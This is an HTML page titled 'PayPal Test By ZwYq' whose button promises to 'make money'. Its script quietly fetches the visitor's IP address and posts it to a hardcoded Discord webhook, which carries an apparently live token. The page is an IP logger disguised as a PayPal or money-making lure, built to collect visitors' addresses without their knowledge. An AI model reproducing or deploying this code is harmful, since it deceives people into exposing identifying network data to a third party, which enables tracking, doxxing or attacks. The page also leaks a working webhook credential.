<!DOCTYPE html>
<html>
  <head>
    <style>
      body {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        background-color: #000;
      }

      h1 {
        font-size: 32px;
        color: #8400B6;
        text-align: center;
      }

      button {
        margin-top: 10px;
        padding: 10px 20px;
        font-size: 16px;
        background-color: #333;
        color: #fff;
        border: none;
        border-radius: 5px;
        cursor: pointer;
      }
    </style>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
      function sendIP() {
        // Fetches the user's IP address
        $.getJSON("https://api.ipify.org?format=json", function(data) {
          var ipAddress = data.ip;
          var webhookURL = "https://discord.com/api/webhooks/1114345070775246938/Z3CNuKtr255UMW5svbpty9J5y0c80YijPcDMrhVW1s4rnlR2cGAEEQDCrmXVHLIVGoMy"; // Replace this with your actual Discord webhook URL

          // Create a JSON payload with the IP address
          var payload = JSON.stringify({ content: "IP: " + ipAddress });

          // Send a POST request to the Discord webhook
          $.ajax({
            url: webhookURL,
            type: "POST",
            dataType: "json",
            data: payload,
            contentType: "application/json",
            success: function() {
              console.log("IP sent to Discord");
            },
            error: function(xhr, status, error) {
              console.error("Error sending IP to Discord:", error);
            }
          });
        });
      }
    </script>
  </head>
  <body>
    <h1>PayPal Test By ZwYq</h1>
    <button onclick="sendIP()">This Should Make Visual Money ðŸ¤‘ðŸ¤‘ðŸ¤‘</button>
  </body>
</html>
